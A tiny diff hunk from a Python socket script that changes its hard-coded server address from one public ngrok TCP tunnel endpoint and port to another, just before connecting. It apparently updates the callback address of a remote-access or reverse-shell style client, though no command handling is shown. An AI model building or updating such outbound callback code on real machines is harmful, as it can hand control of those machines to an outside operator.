@@ -5,8 +5,8 @@ import struct
 import threading
 
 s = socket.socket()
-serverip = "6.tcp.ngrok.io"
-serverport = 17601
+serverip = "4.tcp.ngrok.io"
+serverport = 19491
 s.connect((serverip, serverport))
 
 
